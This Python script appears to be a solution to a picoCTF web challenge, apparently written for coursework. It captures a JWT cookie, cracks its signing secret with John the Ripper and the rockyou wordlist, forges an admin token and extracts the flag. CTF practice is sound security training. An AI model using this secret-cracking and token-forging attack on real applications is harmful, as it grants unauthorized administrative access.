import jwt
import subprocess
import requests

URL = "http://2019shell1.picoctf.com:45158/"

PAYLOAD = {
    'user': "bruh"
}

response = requests.post(url=URL, data=PAYLOAD)

cookie = response.request.headers.get('Cookie')
cookie = cookie[4:]

toWrite = "user:" + cookie

file = open("passwd", "w")
file.write(toWrite)
file.close()

currDir = "../CSE331_HW02/"

process = "../john-1.9.0-jumbo-1/run/john"
arg11 = currDir + "passwd"
arg12 = "--wordlist=" + currDir + "rockyou.txt"
arg21 = currDir + "passwd"
arg22 = "--show"

subprocess.check_output([process, arg11, arg12], stderr=subprocess.DEVNULL)

output = subprocess.check_output([process, arg21, arg22])
output = output.decode("utf-8")

secret = output[5:14]

encoded_jwt = jwt.encode({'user': 'admin'}, secret, algorithm='HS256')
encoded_jwt = encoded_jwt.decode('utf-8')

COOKIES = {'jwt': encoded_jwt}

response = requests.get(url=URL, cookies=COOKIES)

data = response.text

flagIndex = data.index('picoCTF{') + 8

flag = data[flagIndex:flagIndex + 63]

print(flag)
